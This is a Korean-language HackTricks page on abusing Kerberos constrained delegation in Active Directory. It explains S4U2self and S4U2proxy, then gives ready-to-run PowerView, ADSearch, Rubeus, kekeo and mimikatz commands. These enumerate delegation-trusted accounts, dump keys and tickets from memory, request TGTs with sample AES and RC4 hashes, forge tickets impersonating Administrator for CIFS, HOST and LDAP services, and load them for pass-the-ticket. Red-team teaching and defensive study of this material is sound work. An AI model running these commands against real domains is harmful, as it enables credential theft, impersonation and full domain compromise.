# 제약된 위임

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 제약된 위임

도메인 관리자는 이를 통해 컴퓨터가 다른 컴퓨터의 **서비스**에 대해 **사용자 또는 컴퓨터를 가장할 수 있도록 허용**할 수 있습니다.

* **사용자 자체 서비스 (**_**S4U2self**_**):** **서비스 계정**이 [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D)를 포함하는 _userAccountControl_ 값을 가지고 있다면, 다른 사용자를 대신하여 자체적으로(TGS) TGS를 얻을 수 있습니다.
* **사용자 대리 서비스(**_**S4U2proxy**_**):** **서비스 계정**은 **msDS-AllowedToDelegateTo**에 설정된 서비스를 대신하여 어떤 사용자로부터 TGS를 얻을 수 있습니다. 이를 위해 먼저 해당 사용자로부터 자체로 TGS를 얻을 필요가 있지만, 다른 TGS를 요청하기 전에 S4U2self을 사용하여 해당 TGS를 얻을 수 있습니다.

**참고**: AD에서 '계정이 민감하며 위임할 수 없음'으로 표시된 사용자는 **가장할 수 없습니다**.

이는 서비스의 해시를 **침해**하면 사용자를 **가장할 수 있고** 해당 사용자의 **서비스에 대한 액세스**를 얻을 수 있다는 것을 의미합니다(가능한 **권한 상승**).

또한, 사용자가 가장할 수 있는 서비스뿐만 아니라 **모든 서비스에 대한 액세스**도 갖게 됩니다. 왜냐하면 SPN(요청된 서비스 이름)이 확인되지 않고 권한만 확인되기 때문입니다. 따라서 **CIFS 서비스**에 액세스할 수 있다면 Rubeus에서 `/altservice` 플래그를 사용하여 **HOST 서비스**에도 액세스할 수 있습니다.

또한, **DC에서의 LDAP 서비스 액세스**는 **DCSync**를 악용하기 위해 필요한 것입니다.

{% code title="열거" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% code title="TGT 가져오기" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
TGT 티켓이나 RC4 또는 AES256을 시스템으로 컴퓨터에 없이 얻을 수 있는 다른 방법들이 있습니다. 이는 프린터 버그와 제약이 없는 위임, NTLM 릴레이 및 Active Directory 인증서 서비스 남용 등이 있습니다.

TGT 티켓(또는 해시)만 가지고도 전체 컴퓨터를 침해하지 않고 이 공격을 수행할 수 있습니다.
{% endhint %}

{% code title="Rubeus 사용" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
{% endcode %}

[**ired.team에서 더 많은 정보를 확인하세요.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
